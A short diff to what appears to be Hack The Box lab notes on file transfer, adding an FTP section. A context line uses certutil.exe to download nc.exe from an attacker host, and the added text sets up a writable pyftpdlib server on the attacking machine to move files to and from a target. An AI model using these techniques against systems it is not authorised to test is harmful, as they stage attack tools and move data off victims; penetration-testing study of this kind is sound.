@@ -173,6 +173,11 @@ C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
 ```
 
 ___
+# FTP
+
+`python -m pyftpdlib -p 21 --write` from LHOST, then DownloadString from RHOST
+
+---
 
 ## Extra Practice
 
